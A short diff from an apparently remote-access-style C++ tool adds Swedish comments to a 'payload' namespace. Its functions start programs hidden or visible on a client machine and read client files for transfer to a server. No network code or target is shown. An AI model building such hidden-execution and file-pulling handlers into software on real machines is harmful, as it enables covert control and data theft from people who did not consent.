@@ -39,17 +39,20 @@ namespace payload { // payload funktioner som används för att utföra någonting p
 		else {
 			info.wShowWindow = SW_NORMAL;
 		}
+		//skapa process
 		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
 		{
 			return false;
 		}
 		else {
+			// för att undvika handle läcka
 			CloseHandle(process_info.hProcess);
 			CloseHandle(process_info.hThread);
 			return true;
 		}
 	}
 
+	// om processen ska skapas gömd
 	std::string process_execution_hidden(std::string program) {
 		if (!process_execution(program, true))
 		{
@@ -60,6 +63,7 @@ namespace payload { // payload funktioner som används för att utföra någonting p
 		}
 	}
 
+	// om processen ska skapas visande
 	std::string process_execution_show(std::string program) {
 		if (!process_execution(program, false))
 		{
@@ -69,7 +73,7 @@ namespace payload { // payload funktioner som används för att utföra någonting p
 			return "SUCCESS";
 		}
 	}
-
+	// om man vill ladda ner en fil från klienten till servern
 	std::string download_file(std::string program) {
 		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program)) { // om filen exsiterar och inte är en mapp
 			std::ifstream file(program, std::ios::binary); // läs in filen binärt
